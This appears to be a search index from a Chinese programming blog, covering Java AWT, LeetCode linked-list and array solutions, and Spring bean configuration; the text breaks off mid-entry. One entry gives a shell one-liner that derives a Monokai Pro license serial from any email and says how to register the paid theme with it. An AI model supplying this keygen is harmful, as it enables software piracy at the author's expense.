[{"categories":["Java"],"content":"使用AWT创建一个窗口 AWT中每个窗口单位是以 Frame 为单位的，我们可以使用 Frame 来创建一个窗口。 package com.alextang; import java.awt.*; public class Main { public static void main(String[] args) { Frame frame = new Frame(); } } 但是默认的 Frame 是不可见的，此时可以通过 setVisible 方法来使其可见。 package com.alextang; import java.awt.*; public class Main { public static void main(String[] args) { Frame frame = new Frame(); frame.setVisible(true); } } 现在，窗口应该可以显示在屏幕的左上角。并且大小非常小。下面将讨论 Frame 其他的一些方法，来让这个窗口变的更好看一点。 ","date":"2024-06-21","objectID":"/articles/2024/06/java-awt-1/:1:0","tags":["Java","JavaSE","AWT"],"title":"Java AWT 创建窗口","uri":"/articles/2024/06/java-awt-1/"},{"categories":["Java"],"content":"Frame常用方法 先上代码： package com.alextang; import java.awt.*; public class Main { public static void main(String[] args) { Frame frame = new Frame(); frame.setSize(500, 300); Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize(); int x = (int) (screenSize.getWidth() / 2 - (double) frame.getWidth() / 2); int y = (int) (screenSize.getHeight() / 2 - (double) frame.getHeight() / 2); frame.setLocation(x, y); frame.setAlwaysOnTop(true); // frame.setResizable(false) // frame.setLocationRelativeTo(null); frame.setCursor(new Cursor(Cursor.HAND_CURSOR)); frame.setVisible(true); } } 主要涉及到这几个方法： setSize 设置窗口的大小，单位是像素。 setLocation 设置窗口所在的位置。这个位置实际上是指左上角的点在屏幕上点的坐标。 setAlwaysOnTop 设置窗口是否永远在顶层，不会因为失焦而让其被其他窗口遮挡。 setResizable 设置窗口大小是否可以被用户调整。 setLocationRelativeTo 设置该窗口位于另外一个窗口的中心位置。特别的，如果参数值为 null ，那么该窗口将位于整个窗口的中心位置。 setCursor 设置指针位于窗口内部时指针的样式。需要一个 Cursor 对象作为参数。 ","date":"2024-06-21","objectID":"/articles/2024/06/java-awt-1/:2:0","tags":["Java","JavaSE","AWT"],"title":"Java AWT 创建窗口","uri":"/articles/2024/06/java-awt-1/"},{"categories":["Java"],"content":"关于窗口位置居中 并没有一个特别的函数使当前窗口相对于整个屏幕居中，但是，参照上述，可以使用 setLocationRelativeTo(null) 来实现窗口位置相对于屏幕居中。当然，还有另外一种办法，就是在设置好窗口的大小后，根据屏幕的大小和窗口的大小 setLocation 到相应的位置。 注意屏幕中心的位置实际上是窗口左上角向左上方移动 $\\frac{1}{2}$ 个对角线的距离。 于是可以写出如下代码： Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize(); int x = (int) (screenSize.getWidth() / 2 - (double) frame.getWidth() / 2); int y = (int) (screenSize.getHeight() / 2 - (double) frame.getHeight() / 2); frame.setLocation(x, y); ","date":"2024-06-21","objectID":"/articles/2024/06/java-awt-1/:3:0","tags":["Java","JavaSE","AWT"],"title":"Java AWT 创建窗口","uri":"/articles/2024/06/java-awt-1/"},{"categories":["杂项"],"content":"使用一个Linux终端，输入： email=yourMail@mail.com echo -n fd330f6f-3f41-421d-9fe5-de742d0c54c0$email | md5sum | cut -c1-25 | sed 's/.\\{5\\}/\u0026-/g;s/-$//g' 其中，将 yourMail@mai.com 替换成任意的邮箱名称（不一定要可用）。第二行将输出相应邮件对应的序列号。 打开vscode，按下 Ctrl+Shift+p ，输入 Monokai Pro: enter license，回车后依次输入相应的邮件和序列号，即可注册成功。 ","date":"2024-06-20","objectID":"/articles/2024/06/monokai-pro/:0:0","tags":["Vscode","Monokai Pro"],"title":"Monokai Pro主题破解","uri":"/articles/2024/06/monokai-pro/"},{"categories":["LeetCode"],"content":"移除链表 建议是直接加上虚拟头节点，也就是头元素指向链表的第一个元素。这样每次删除只需要找到待删除元素的前一个点pre ，然后删除节点node 。 pre.next = pre.next.next; ","date":"2024-05-08","objectID":"/articles/2024/05/leetcode-linkedlist/:1:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：链表","uri":"/articles/2024/05/leetcode-linkedlist/"},{"categories":["LeetCode"],"content":"实现一个链表 class MyLinkedList { int size; Node head; public MyLinkedList() { size = 0; head = new Node(0); } public int get(int index) { if (index \u003c 0 || index \u003e= size) return -1; Node p = head; for (int i = 0;i \u003c= index;++i){ p = p.next; } // Node test = head; // while (test != null) { // System.out.print(test.val + \" \"); // test = test.next; // } // System.out.print(\"size: \" + this.size + \"\\n\"); return p.val; } public void addAtHead(int val) { Node insert = new Node(val); insert.next = head.next; head.next = insert; size++; } public void addAtTail(int val) { Node insert = new Node(val); Node p = head.next; size++; if (p == null) { head.next = insert; return; } while (p != null \u0026\u0026 p.next != null) p = p.next; p.next = insert; insert.next = null; } public void addAtIndex(int index, int val) { if (index \u003e size) return; if (index \u003c 0) index = 0; Node p = head; Node insert = new Node(val); for (int i = 0;i \u003c index;++i) p = p.next; insert.next = p.next; p.next = insert; size++; } public void deleteAtIndex(int index) { if (index \u003c 0 || index \u003e= size) return; if (index == 0) { head = head.next; size--; return; } Node p = head; for (int i = 0;i \u003c index;++i) p = p.next; p.next = p.next.next; size--; } } class Node { int val; Node next; Node (){} Node (int val){ this.val = val; } } /** * Your MyLinkedList object will be instantiated and called as such: * MyLinkedList obj = new MyLinkedList(); * int param_1 = obj.get(index); * obj.addAtHead(val); * obj.addAtTail(val); * obj.addAtIndex(index,val); * obj.deleteAtIndex(index); */ ","date":"2024-05-08","objectID":"/articles/2024/05/leetcode-linkedlist/:2:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：链表","uri":"/articles/2024/05/leetcode-linkedlist/"},{"categories":["LeetCode"],"content":"反转链表 保存每个节点的前置节点，然后每次对每个节点进行反转，让其next 等于pre。 while (cur) { ListNode tmp = cur.next; cur.next = pre; pre = cur; cur = tmp; } ","date":"2024-05-08","objectID":"/articles/2024/05/leetcode-linkedlist/:3:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：链表","uri":"/articles/2024/05/leetcode-linkedlist/"},{"categories":["LeetCode"],"content":"交换相邻元素 模拟即可，使用虚拟头节点，交换下一个和下下一个节点。 while (cur.next != null \u0026\u0026 cur.next.next != null) { temp = cur.next.next.next; firstnode = cur.next; secondnode = cur.next.next; cur.next = secondnode; // 步骤一 secondnode.next = firstnode; // 步骤二 firstnode.next = temp; // 步骤三 cur = firstnode; // cur移动，准备下一轮交换 } ","date":"2024-05-08","objectID":"/articles/2024/05/leetcode-linkedlist/:4:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：链表","uri":"/articles/2024/05/leetcode-linkedlist/"},{"categories":["LeetCode"],"content":"删除倒数N节点 双指针的经典应用，如果要删除倒数第n个节点，让fast移动n步，然后让fast和slow同时移动，直到fast指向链表末尾。删掉slow所指向的节点就可以了。 让fast和slow相差n个节点，然后fast移动到链表末尾，则slow就是要删除的节点。 ","date":"2024-05-08","objectID":"/articles/2024/05/leetcode-linkedlist/:5:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：链表","uri":"/articles/2024/05/leetcode-linkedlist/"},{"categories":["LeetCode"],"content":"链表相交 题意是链表相交之后公用了一条链表。假设A链表的长度为lena, B链表的长度为lenb ，那么相交的公共节点最早也要出现在lena - lenb 的位置（假设lena \u003e lenb）。换句话说就是两个链表在相交之后不可能再分开。 那么就从同时遍历短链表的长度，找找有没有相同的节点即可， ","date":"2024-05-08","objectID":"/articles/2024/05/leetcode-linkedlist/:6:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：链表","uri":"/articles/2024/05/leetcode-linkedlist/"},{"categories":["LeetCode"],"content":"环形链表 双指针的经典应用，快指针每次走两格，慢指针每次走一个，快指针如果能再次和慢指针相遇，则说明有环。 关于环的入口，在快慢指针相遇的地方再次出发一个指针，如果再次相遇，相遇点就是环的入口处。 链表的大部分题目还是模拟，但是偶尔会有快慢指针的题目，需要额外注意一下。 ","date":"2024-05-08","objectID":"/articles/2024/05/leetcode-linkedlist/:7:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：链表","uri":"/articles/2024/05/leetcode-linkedlist/"},{"categories":["LeetCode"],"content":"二分查找 实现lower_bound和upper_bound 关键是掌握循环不变量 以lower_bound为例。我们假设L所指的位置是最终的答案，且当R在L左边一格的时候退出循环（为什么是一格，因为每次只移动一格）。那么L左边的元素将全部满足$arr_i \u003c t$ ，R右边的元素将全部满足$arr_i ≥ t$ 。此时的答案就是L所指元素。 为了满足上述假设，在每次循环中考察mid元素，若$arr_{mid} \u003c t$，那么mid元素将属于L左边的区域。又因为数组递增，因此L应该移动到mid的右边。同理，$arr_{mid}≥t$的时候，mid元素应该属于R右边的区域。 lower_bound的实现如下： public static int lowerBound(int[] arr, int target, int left, int right) { if (left \u003c 0 || right \u003e arr.length) return -1; right -= 1; while (left \u003c= right) { int mid = (left + right) \u003e\u003e 1; if (arr[mid] \u003c target) { left = mid + 1; } else { right = mid - 1; } } return left \u003e= arr.length ? -1 : left; } 同理upper_bound： public static int upperBound(int[] arr, int target, int left, int right) { if (left \u003c 0 || right \u003e arr.length) return -1; right -= 1; while (left \u003c= right) { int mid = left + ((right - left) \u003e\u003e 1); //int mid = (left + right) \u003e\u003e 1; if (arr[mid] \u003c= target) { left = mid + 1; } else { right = mid - 1; } } return left \u003e= arr.length ? -1 : left; } ","date":"2024-05-07","objectID":"/articles/2024/05/leetcode-arr/:1:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：数组","uri":"/articles/2024/05/leetcode-arr/"},{"categories":["LeetCode"],"content":"移除元素 快慢指针，快指针遍历整个待操作数组，慢指针指在操作后数组的最后一位（也就是数组长度）。如果当前元素不要删除，那么就把该元素移动到慢指针的位置上，同时慢指针向后移动。 ","date":"2024-05-07","objectID":"/articles/2024/05/leetcode-arr/:2:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：数组","uri":"/articles/2024/05/leetcode-arr/"},{"categories":["LeetCode"],"content":"有序数组的平方 特殊的双指针，因为平方数必然在两端出现，自然从两边开始选取。 ","date":"2024-05-07","objectID":"/articles/2024/05/leetcode-arr/:3:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：数组","uri":"/articles/2024/05/leetcode-arr/"},{"categories":["LeetCode"],"content":"滑动窗口 滑动窗口适用于具有单调性的题目。换句话说，对一个数组的右端点右移会在某一刻满足（或不满足）条件，然后将其左端点右移，也会存在一个时刻不满足（或者满足）条件，在满足（或者不满足）条件的时刻求一个极值。 以3. 无重复字符的最长子串为例，首先将右端点持续右移，直到区间中存在重复的字符，接着将左端点右移，删除字符，直到区间中不再存在重复的字符位置，计算此时子串的长度并保存目前的最大长度。 时间复杂度：由于数组的循环次数取决于左端点和右端点的移动次数，而数组中的每一个元素最多进入窗口一次，也最多出窗口一次，因此总体的时间复杂度是$O(n)$。代码如下： class Solution { public int lengthOfLongestSubstring(String s) { int ans = 0; int left = 0; Map\u003cCharacter, Integer\u003e cnt = new HashMap\u003c\u003e(); char[] str = s.toCharArray(); for (int right = 0; right \u003c str.length; ++ right) { cnt.put(str[right], cnt.getOrDefault(str[right], 0) + 1); while (cnt.getOrDefault(str[right], 0) \u003e 1) { cnt.put(str[left], cnt.get(str[left]) - 1); left++; } ans = Math.max(ans, right - left + 1); } return ans; } } ","date":"2024-05-07","objectID":"/articles/2024/05/leetcode-arr/:4:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：数组","uri":"/articles/2024/05/leetcode-arr/"},{"categories":["LeetCode"],"content":"模拟 59. 螺旋矩阵 II 分清边长的奇偶，是否存在中间的数字 每条边只走n - 1 步，这样可以平均分给4条边长 进入下一圈时，起点相当于沿着主对角线移动，移动的步数实际上减少两次。 ","date":"2024-05-07","objectID":"/articles/2024/05/leetcode-arr/:5:0","tags":["Leetcode","Algorithm","Arrays"],"title":"leetcode整理：数组","uri":"/articles/2024/05/leetcode-arr/"},{"categories":["Java"],"content":"Bean的生命周期 除了直接修改构造函数，同时可以为Bean指定初始化方法和销毁方法，让其在对象创建和销毁的时候执行一些其他的任务： init-method ：初始化方法 destroy-method ：销毁方法 注意：只有单例模式下的Bean，Spring才能完成销毁操作。如果是原型模式，则Spring无法关注其完整的生命周期。 ","date":"2024-05-06","objectID":"/articles/2024/05/spring-life/:0:1","tags":["Java","JavaEE","SSM"],"title":"Spring基础:生命周期和继承","uri":"/articles/2024/05/spring-life/"},{"categories":["Java"],"content":"Bean的继承 这里的继承不是指Java中类的继承，而是对Bean的属性的继承。在两个Bean存在相似的属性时，可以直接使用继承来获得相同的属性而不用重新写。 \u003cbean name=\"artStudent\" class=\"com.test.bean.ArtStudent\"\u003e \u003cproperty name=\"name\" value=\"小明\"/\u003e \u003c/bean\u003e \u003cbean class=\"com.test.bean.SportStudent\"\u003e \u003cproperty name=\"name\" value=\"小明\"/\u003e \u003c/bean\u003e 对于上面的两个Bean，其中的name 属性的值是一致的，为了减少冗余，我们可以使用parent 属性进行继承。 \u003cbean class=\"com.test.bean.SportStudent\" parent=\"artStudent\"/\u003e 这样，在ArtStudent Bean中配置的属性，会直接继承给SportStudent Bean（注意，所有配置的属性，在子Bean中必须也要存在，并且可以进行注入，否则会出现错误）当然，如果子类中某些属性比较特殊，也可以在继承的基础上单独配置： \u003cbean name=\"artStudent\" class=\"com.test.bean.ArtStudent\" abstract=\"true\"\u003e \u003cproperty name=\"name\" value=\"小明\"/\u003e \u003cproperty name=\"id\" value=\"1\"/\u003e \u003c/bean\u003e \u003cbean class=\"com.test.bean.SportStudent\" parent=\"artStudent\"\u003e \u003cproperty name=\"id\" value=\"2\"/\u003e \u003c/bean\u003e 如果我们只是希望某一个Bean仅作为一个配置模版供其他Bean继承使用，那么我们可以将其配置为abstract，这样，容器就不会创建这个Bean的对象了： \u003cbean name=\"artStudent\" class=\"com.test.bean.ArtStudent\" abstract=\"true\"\u003e \u003cproperty name=\"name\" value=\"小明\"/\u003e \u003c/bean\u003e \u003cbean class=\"com.test.bean.SportStudent\" parent=\"artStudent\"/\u003e 注意，一旦声明为抽象Bean，那么就无法通过容器获取到其实例化对象了。 另外，如果我们希望整个上下文中所有的Bean都采用某种配置，我们可以在最外层的beans标签中进行默认配置： default-init-method 默认初始化方法 default-lazy-init 是否默认懒加载 …… ","date":"2024-05-06","objectID":"/articles/2024/05/spring-life/:0:2","tags":["Java","JavaEE","SSM"],"title":"Spring基础:生命周期和继承","uri":"/articles/2024/05/spring-life/"},{"categories":["Java"],"content":"工厂模式和工厂Bean 如果某个类的设计模式是工厂模式，Spring将无法构造出类的实例，而是只能通过该类的Factory 构造方法拿到实例化的类。 此时我们可以直接使用factory-method 属性来制定类的构造工厂： \u003cbean class=\"com.test.bean.StudentFactory\" factory-method=\"getStudent\"/\u003e 注意：实际上还是创建了Student的Bean，而不是Factory 的Bean 同时，通过构造工厂获得的实例无法再被Spring管理，只能通过Factory进行初始化等。 同时，也可以将StudentFactory直接注册为Bean，然后通过StudentFactory 的实例来获得Student 的实例。 \u003cbean name=\"studentFactory\" class=\"com.test.bean.StudentFactory\"/\u003e 然后再使用factory-bean来指定Bean的工厂Bean： \u003cbean factory-bean=\"studentFactory\" factory-method=\"getStudent\"/\u003e 此时获得的Bean就可以和正常的类一样进行依赖注入等操作。 这里还有一个很细节的操作，如果我们想获取工厂Bean为我们提供的Bean，可以直接输入工厂Bean的名称，这样不会得到工厂Bean的实例，而是工厂Bean生产的Bean的实例： Student bean = (Student) context.getBean(\"studentFactory\"); 当然，如果我们需要获取工厂类的实例，可以在名称前面添加\u0026符号： StudentFactory bean = (StudentFactory) context.getBean(\"\u0026studentFactory\"); 另外，如果可以修改Factory 类的话，可以通过实现FactoryBean\u003cT\u003e 接口的getObject()和getObjectType() 方法来直接注册为工厂。 ","date":"2024-05-06","objectID":"/articles/2024/05/spring-factory/:0:1","tags":["Java","JavaEE","SSM"],"title":"Spring基础:适配工厂设计模式","uri":"/articles/2024/05/spring-factory/"},{"categories":["Java"],"content":"Java自动装配 当我们的类中存在其他类的成员的时候，可以使用自动装配来自动进行实例化： package org.alextang.entity.student; import org.alextang.entity.teacher.Teacher; public class Student { private Teacher teacher; public void hello() { System.out.println(\"Hello World!\"); } public void teach() { teacher.teach(); } public void setTeacher(Teacher teacher) { this.teacher = teacher; } } 使用autowire 的标签属性即可开启某个类的自动装配。其中分为byType 和byName的两种值。 byType可以根据依赖的类型找到适合的类进行实例化： \u003cbean name=\"programTeacher\" class=\"org.alextang.entity.teacher.ProgramTeacher\"/\u003e \u003cbean name=\"Student\" class=\"org.alextang.entity.student.ArtStudent\" autowire=\"byType\"\u003e 此时，Student 类会自动找到org.alextang.entity.teacher.ProgramTeacher 作为依赖注入。 如果有多个同样的类，那么这种byType 的方式便不再好用，此时可以使用byName 进行精确的定位。 byName需要同时修改set函数的名称 public class Student { private Teacher teacher; public void hello() { System.out.println(\"Hello World!\"); } public void teach() { teacher.teach(); } public void setArtTeacher(Teacher teacher) { this.teacher = teacher; } } \u003cbean name=\"programTeacher\" class=\"org.alextang.entity.teacher.ProgramTeacher\"/\u003e \u003cbean name=\"artTeacher\" class=\"org.alextang.entity.teacher.ArtTeacher\"/\u003e \u003cbean name=\"Student\" class=\"org.alextang.entity.student.ArtStudent\" autowire=\"byName\"\u003e 此时就会自动寻找org.alextang.entity.teacher.ArtTeacher 作为依赖注入。 还可以使用constructer 为值进行依赖注入。此时需要指定有参的构造函数。 ","date":"2024-05-05","objectID":"/articles/2024/05/spring-autowire/:0:1","tags":["Java","JavaEE","SSM"],"title":"Spring基础:自动装配","uri":"/articles/2024/05/spring-autowire/"},{"categories":["Java"],"content":"解决byType的冲突 当byType 选项拥有多个候选项的适合，可以主动排除一个候选项，使其精确选择。 使用autowire-candidate 设定为false 的适合，将排除该候选项。 \u003cbean name=\"programTeacher\" class=\"org.alextang.entity.teacher.ProgramTeacher\"/\u003e \u003cbean name=\"artTeacher\" class=\"org.alextang.entity.teacher.ArtTeacher\" autowire-candidate=\"false\"/\u003e \u003cbean name=\"Student\" class=\"org.alextang.entity.student.ArtStudent\" autowire=\"byType\"\u003e 同时可以使用primary=\"true\" 设置优先选择的一个类的实现。 ","date":"2024-05-05","objectID":"/articles/2024/05/spring-autowire/:0:2","tags":["Java","JavaEE","SSM"],"title":"Spring基础:自动装配","uri":"/articles/2024/05/spring-autowire/"},{"categories":["LeetCode每日一题"],"content":" 1146. 快照数组 ","date":"2024-04-26","objectID":"/articles/2024/04/leetcode-4.26/:0:0","tags":["LeetCode","Algorithm","算法"],"title":"LeetCode-快照数组","uri":"/articles/2024/04/leetcode-4.26/"},{"categories":["LeetCode每日一题"],"content":"题目 实现支持下列接口的「快照数组」- SnapshotArray： SnapshotArray(int length) - 初始化一个与指定长度相等的 类数组 的数据结构。初始时，每个元素都等于 0。 void set(index, val) - 会将指定索引 index 处的元素设置为 val。 int snap() - 获取该数组的快照，并返回快照的编号 snap_id（快照号是调用 snap() 的总次数减去 1）。 int get(index, snap_id) - 根据指定的 snap_id 选择快照，并返回该快照指定索引 index 的值。 示例： 输入：[\"SnapshotArray\",\"set\",\"snap\",\"set\",\"get\"] [[3],[0,5],[],[0,6],[0,0]] 输出：[null,null,0,null,5] 解释： SnapshotArray snapshotArr = new SnapshotArray(3); // 初始化一个长度为 3 的快照数组 snapshotArr.set(0,5); // 令 array[0] = 5 snapshotArr.snap(); // 获取快照，返回 snap_id = 0 snapshotArr.set(0,6); snapshotArr.get(0,0); // 获取 snap_id = 0 的快照中 array[0] 的值，返回 5 提示： 1 \u003c= length \u003c= 50000 题目最多进行50000 次set，snap，和 get的调用 。 0 \u003c= index \u003c length 0 \u003c= snap_id \u003c 我们调用 snap() 的总次数 0 \u003c= val \u003c= 10^9 ","date":"2024-04-26","objectID":"/articles/2024/04/leetcode-4.26/:0:1","tags":["LeetCode","Algorithm","算法"],"title":"LeetCode-快照数组","uri":"/articles/2024/04/leetcode-4.26/"},{"categories":["LeetCode每日一题"],"content":"思路 很抽象的表述。反正就是维护一个数组，在需要的时候储存一个当前数组状态的备份。然后同时支持取出相应时间的数组数据。 很容易想到使用HashMap维护一个快照id到数组的状态。但是实际测试中，由于每次都需要创建一个新的数组对象插入HashMap中，因此会导致MLE 。 这里的问题出在，每次都将数组所有的元素保存下来。但是每次查询并不需要维护整个数组，只需要输出相应数组元素即可。 因此可以使用一个TreeMap （key有序，可以在查找上变得快一点），维护一个snap_id 到元素值的映射，同时外层又有一个HashMap映射到该Map上。这样，相当于数组的每个元素都是一个TreeMap，保存着历史的备份。 那么，只需要在插入节点的情况下，在HashMap中插入一个TreeMap，接着将值保存在相应的snap_id 中。 public void set(int index, int val) { mp.computeIfAbsent(index, key -\u003e new TreeMap\u003c\u003e()).put(snap_id, val); } 每次查询，首先判断mp中index元素是否存在，不存在就是0，存在的话就从TreeMap中寻找值是snap_id的key即可。 public int get(int index, int snap_id) { Map.Entry\u003cInteger, Integer\u003e entry = mp.computeIfAbsent(index, key -\u003e new TreeMap\u003c\u003e()).floorEntry(snap_id); return entry == null ? 0 : entry.getValue(); } 完整代码： class SnapshotArray { Map\u003cInteger, TreeMap\u003cInteger, Integer\u003e\u003e mp; int snap_id; public SnapshotArray(int length) { snap_id = 0; mp = new HashMap\u003c\u003e(); } public void set(int index, int val) { mp.computeIfAbsent(index, key -\u003e new TreeMap\u003c\u003e()).put(snap_id, val); } public int snap() { return snap_id++; } public int get(int index, int snap_id) { Map.Entry\u003cInteger, Integer\u003e entry = mp.computeIfAbsent(index, key -\u003e new TreeMap\u003c\u003e()).floorEntry(snap_id); return entry == null ? 0 : entry.getValue(); } } /** * Your SnapshotArray object will be instantiated and called as such: * SnapshotArray obj = new SnapshotArray(length); * obj.set(index,val); * int param_2 = obj.snap(); * int param_3 = obj.get(index,snap_id); */ ","date":"2024-04-26","objectID":"/articles/2024/04/leetcode-4.26/:0:2","tags":["LeetCode","Algorithm","算法"],"title":"LeetCode-快照数组","uri":"/articles/2024/04/leetcode-4.26/"},{"categories":["LeetCode每日一题"],"content":" 2739. 总行驶距离-Easy ","date":"2024-04-25","objectID":"/articles/2024/04/leetcode-4.25/:0:0","tags":["LeetCode","Algorithm","算法"],"title":"LeetCode-总行驶距离","uri":"/articles/2024/04/leetcode-4.25/"},{"categories":["LeetCode每日一题"],"content":"题目 卡车有两个油箱。给你两个整数，mainTank 表示主油箱中的燃料（以升为单位），additionalTank 表示副油箱中的燃料（以升为单位）。 该卡车每耗费 1 升燃料都可以行驶 10 km。每当主油箱使用了 5 升燃料时，如果副油箱至少有 1 升燃料，则会将 1 升燃料从副油箱转移到主油箱。 返回卡车可以行驶的最大距离。 注意：从副油箱向主油箱注入燃料不是连续行为。这一事件会在每消耗 5 升燃料时突然且立即发生。 示例 1： 输入：mainTank = 5, additionalTank = 10 输出：60 解释： 在用掉 5 升燃料后，主油箱中燃料还剩下 (5 - 5 + 1) = 1 升，行驶距离为 50km 。 在用掉剩下的 1 升燃料后，没有新的燃料注入到主油箱中，主油箱变为空。 总行驶距离为 60km 。 示例 2： 输入：mainTank = 1, additionalTank = 2 输出：10 解释： 在用掉 1 升燃料后，主油箱变为空。 总行驶距离为 10km 。 ","date":"2024-04-25","objectID":"/articles/2024/04/leetcode-4.25/:0:1","tags":["LeetCode","Algorithm","算法"],"title":"LeetCode-总行驶距离","uri":"/articles/2024/04/leetcode-4.25/"},{"categories":["LeetCode每日一题"],"content":"思路 这题没啥好说的，就是每五升油，从副油箱换一升油，直到换完。剩下的油一升10公里。 不会数学推导，直接模拟。 class Solution { public int distanceTraveled(int mainTank, int additionalTank) { int sum = 0; while (mainTank - 5 \u003e= 0) { if (additionalTank \u003e= 1) { mainTank -= 4; additionalTank -=1; } else { mainTank -= 5; } sum += 5 * 10; } if (mainTank \u003e 0) sum += mainTank * 10; return sum; } } ","date":"2024-04-25","objectID":"/articles/2024/04/leetcode-4.25/:0:2","tags":["LeetCode","Algorithm","算法"],"title":"LeetCode-总行驶距离","uri":"/articles/2024/04/leetcode-4.25/"},{"categories":["LeetCode每日一题"],"content":" 2385. 感染二叉树需要的总时间-Medium ","date":"2024-04-24","objectID":"/articles/2024/04/leetcode-4-24/:0:0","tags":["LeetCode","Algorithm","算法"],"title":"LeetCode-感染二叉树需要的总时间","uri":"/articles/2024/04/leetcode-4-24/"},{"categories":["LeetCode每日一题"],"content":"题目 给你一棵二叉树的根节点 root ，二叉树中节点的值 互不相同 。另给你一个整数 start 。在第 0 分钟，感染 将会从值为 start 的节点开始爆发。 每分钟，如果节点满足以下全部条件，就会被感染： 节点此前还没有感染。 节点与一个已感染节点相邻。 返回感染整棵树需要的分钟数。 ","date":"2024-04-24","objectID":"/articles/2024/04/leetcode-4-24/:0:1","tags":["LeetCode","Algorithm","算法"],"title":"LeetCode-感染二叉树需要的总时间","uri":"/articles/2024/04/leetcode-4-24/"},{"categories":["LeetCode每日一题"],"content":"思路 就是算从这个节点出发，到达最远节点的距离。那么有个很直观的想法就是做BFS。但是，树上的节点并没有办法存父亲节点的位置。所以首先要将树结构转为图。个人觉得何种遍历方式都可以，只是需要额外保存一个父亲节点的值而已。 int[][] mp = new int[100010][]; int m = 0; public void dfs(TreeNode node, int father) { if (node == null) return; if (node.val \u003e m) m = node.val; int[] e = new int[3]; if (node.left != null) e[0] = node.left.val; if (node.right != null) e[1] = node.right.val; e[2] = father; mp[node.val] = e; dfs(node.left, node.val); dfs(node.right, node.val); } 这里为了省事，直接每个节点都保存三个值：左孩子，右孩子和父亲。有一个节点是没有父亲的，就是根节点，此时的父亲值为0（即代表不存在父亲）。等图建好后就可以使用BFS进行寻路了。每次更新最大值，等到BFS结束即可取到最终的结果。 public int amountOfTime(TreeNode root, int start) { dfs(root, 0); boolean[] vis = new boolean[m + 1]; Queue\u003cint[]\u003e q = new LinkedList\u003c\u003e(); q.add(new int[]{start, 0}); vis[start] = true; int res = 0; while (!q.isEmpty()) { int[] top = q.remove(); int node = top[0]; int minute = top[1]; res = Math.max(res, minute); for (int i = 0; i \u003c 3; ++i) { int t = mp[node][i]; if (t == 0 || vis[t]) continue; q.add(new int[]{t, minute + 1}); vis[t] = true; } } return res; } 题目不难，难在1e5 的数据量上。本来以为会超时，其实很快。 ","date":"2024-04-24","objectID":"/articles/2024/04/leetcode-4-24/:0:2","tags":["LeetCode","Algorithm","算法"],"title":"LeetCode-感染二叉树需要的总时间","uri":"/articles/2024/04/leetcode-4-24/"},{"categories":["Java"],"content":"依赖注入 依赖注入(Dependency Injection, DI)是一种设计模式，也是Spring框架的核心概念之一。现在我们已经了解了如何注册和使用一个Bean，但是这样还远远不够，还记得我们一开始说的，消除类之间的强关联吗？比如现在有一个教师接口： public interface Teacher { void teach(); } 具体的实现有两个： public class ArtTeacher implements Teacher{ @Override public void teach() { System.out.println(\"我是美术老师，我教你画画！\"); } } public class ProgramTeacher implements Teacher{ @Override public void teach() { System.out.println(\"我是编程老师，我教你学Golang！\"); } } 我们的学生一开始有一个老师教他，比如美术老师： public class Student { private Teacher teacher = new ArtTeacher(); //在以前，如果我们需要制定哪个老师教我们，直接new创建对应的对象就可以了 public void study(){ teacher.teach(); } } 但是我们发现，如果美术老师不教了，现在来了一个其他的老师教学生，那么就需要去修改Student类的定义： public class Student { private Teacher teacher = new ProgramTeacher(); ... 可以想象一下，如果现在冒出来各种各样的类都需要这样去用Teacher，那么一旦Teacher的实现发生变化，会导致我们挨个对之前用到Teacher的类进行修改，这就很难受了。 而有了依赖注入之后，Student中的Teacher成员变量，可以由IoC容器来选择一个合适的Teacher对象进行赋值，也就是说，IoC容器在创建对象时，需要将我们预先给定的属性注入到对象中，非常简单，我们可以使用property标签来实现，我们将bean标签展开： \u003cbean name=\"teacher\" class=\"com.test.bean.ProgramTeacher\"/\u003e \u003cbean name=\"student\" class=\"com.test.bean.Student\"\u003e \u003cproperty name=\"teacher\" ref=\"teacher\"/\u003e \u003c/bean\u003e 同时我们还需要修改一下Student类，依赖注入要求对应的属性必须有一个set方法： public class Student { private Teacher teacher; //要使用依赖注入，我们必须提供一个set方法（无论成员变量的访问权限是什么）命名规则依然是驼峰命名法 public void setTeacher(Teacher teacher) { this.teacher = teacher; } ... 使用property来指定需要注入的值或是一个Bean，这里我们选择ProgramTeacher，那么在使用时，Student类中的得到的就是这个Bean的对象了： Student student = context.getBean(Student.class); student.study(); 可以看到，现在我们的Java代码中，没有出现任何的具体实现类信息（ArtTeacher、ProgramTeacher都没出现）取而代之的是那一堆xml配置，这样，就算我们切换老师的实现为另一个类，也不用去调整代码，只需要变动一下Bean的类型就可以： \u003c!-- 只需要修改这里的class即可，现在改为ArtTeacher --\u003e \u003cbean name=\"teacher\" class=\"com.test.bean.ArtTeacher\"/\u003e \u003cbean name=\"student\" class=\"com.test.bean.Student\"\u003e \u003cproperty name=\"teacher\" ref=\"teacher\"/\u003e \u003c/bean\u003e 这样，这个Bean的class就变成了新的类型，并且我们不需要再去调整其他位置的代码，再次启动程序： 通过依赖注入，是不是开始逐渐感受到Spring为我们带来的便利了？当然，依赖注入并不一定要注入其他的Bean，也可以是一个简单的值： \u003cbean name=\"student\" class=\"com.test.bean.Student\"\u003e \u003cproperty name=\"name\" value=\"卢本伟\"/\u003e \u003c/bean\u003e 直接使用value可以直接传入一个具体值。 实际上，在很多情况下，类中的某些参数是在构造方法中就已经完成的初始化，而不是创建之后，比如： public class Student { private final Teacher teacher; //构造方法中完成，所以说是一个final变量 public Student(Teacher teacher){ //Teacher属性是在构造方法中完成的初始化 this.teacher = teacher; } ... 我们前面说了，Bean实际上是由IoC容器进行创建的，但是现在我们修改了默认的无参构造，可以看到配置文件里面报错了： 很明显，是因为我们修改了构造方法，IoC容器默认只会调用无参构造，所以，我们需要指明一个可以用的构造方法，我们展开bean标签，添加一个constructor-arg标签： \u003cbean name=\"teacher\" 